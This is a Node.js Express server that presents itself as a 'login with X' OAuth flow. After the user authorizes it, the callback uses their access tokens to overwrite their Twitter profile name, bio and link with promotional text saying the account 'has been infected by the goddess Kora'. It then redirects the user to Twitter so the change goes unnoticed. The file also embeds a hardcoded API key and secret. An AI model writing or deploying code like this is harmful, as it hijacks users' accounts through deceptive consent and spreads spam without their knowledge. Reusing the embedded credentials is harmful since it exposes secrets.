const express = require("express");
const crypto = require("crypto");
const OAuth = require("oauth-1.0a");
const axios = require("axios");

const app = express();

/* =========================
   CONFIGURACIÓN
   ========================= */
const API_KEY = "HqsQ2W9X8nYEB4tUeQhbgA86s";
const API_SECRET = "50auXIbpm7T6oiFMK8iiNTQI9kuYUE97UrVGmEuVSy6JgDexua";
const CALLBACK_URL = "https://koradrone-1.onrender.com/callback";
/* ========================= */

const requestTokens = new Map();

const oauth = OAuth({
  consumer: { key: API_KEY, secret: API_SECRET },
  signature_method: "HMAC-SHA1",
  hash_function(base_string, key) {
    return crypto
      .createHmac("sha1", key)
      .update(base_string)
      .digest("base64");
  },
});

/* =========================
   PASO 1: REQUEST TOKEN
   ========================= */
app.get("/", async (req, res) => {
  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/request_token",
      method: "POST",
      data: { oauth_callback: CALLBACK_URL },
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData)
    );

    const response = await axios.post(
      requestData.url,
      new URLSearchParams({ oauth_callback: CALLBACK_URL }),
      { headers }
    );

    const params = new URLSearchParams(response.data);
    const oauthToken = params.get("oauth_token");
    const oauthTokenSecret = params.get("oauth_token_secret");

    requestTokens.set(oauthToken, oauthTokenSecret);

    res.redirect(
      `https://api.twitter.com/oauth/authorize?oauth_token=${oauthToken}`
    );
  } catch (err) {
    console.error(err);
    res.send("Error iniciando login con X");
  }
});

/* =========================
   PASO 2: CALLBACK
   ========================= */
app.get("/callback", async (req, res) => {
  const { oauth_token, oauth_verifier } = req.query;

  const oauth_token_secret = requestTokens.get(oauth_token);

  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/access_token",
      method: "POST",
    };

    const token = {
      key: oauth_token,
      secret: oauth_token_secret,
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData, token)
    );

    const response = await axios.post(
      requestData.url,
      null,
      {
        headers,
        params: { oauth_verifier },
      }
    );

    const params = new URLSearchParams(response.data);
    const accessToken = params.get("oauth_token");
    const accessSecret = params.get("oauth_token_secret");
    const userId = params.get("user_id"); // 🔥 CLAVE

    await updateProfile(accessToken, accessSecret, userId);

    // volver a Twitter
    res.redirect("https://twitter.com/home");

  } catch (err) {
    console.error("ERROR ACCESS TOKEN:", err.response?.data || err.message);
    res.send("Error finalizando autenticación");
  }
});

/* =========================
   ACTUALIZAR PERFIL
   ========================= */
async function updateProfile(tokenKey, tokenSecret, userId) {
  const token = { key: tokenKey, secret: tokenSecret };

  await signedPost(
    "https://api.twitter.com/1.1/account/update_profile.json",
    token,
    {
      name: `PROPAGANDA FOR THE GODDESS KORA #${userId}`,
      description:
        "This account has been infected by the goddess Kora, do not resist and fall before her too: sent.bio/mistresskorra.",
      url: "https://x.com/sissyslutty21"
    }
  );
}

/* =========================
   POST FIRMADO
   ========================= */
async function signedPost(url, token, data) {
  const requestData = { url, method: "POST", data };

  const headers = oauth.toHeader(
    oauth.authorize(requestData, token)
  );

  await axios.post(
    url,
    new URLSearchParams(data),
    { headers }
  );
}

app.listen(3000, () => {
  console.log("Servidor listo en http://localhost:3000");
});



